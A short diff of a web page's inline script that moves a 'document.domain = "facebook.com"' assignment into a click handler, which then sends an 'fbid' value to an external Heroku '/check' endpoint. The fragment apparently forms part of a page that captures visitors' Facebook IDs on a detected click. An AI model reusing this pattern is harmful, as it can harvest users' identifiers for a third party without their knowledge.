@@ -85,8 +85,6 @@
 
     <script>
 
-    document.domain = "facebook.com";
-
     var fbid = "";
 
     function magic(){
@@ -151,6 +149,7 @@
           console.log("detected click");
           var loader = document.getElementById('loader');
           loader.style.display = 'block'
+          document.domain = "facebook.com"
           $.get("https://limitless-sierra-68694.herokuapp.com/check?fbid=" + fbid, function(data){
             if(data == "true"){
               setTimeout(function(){
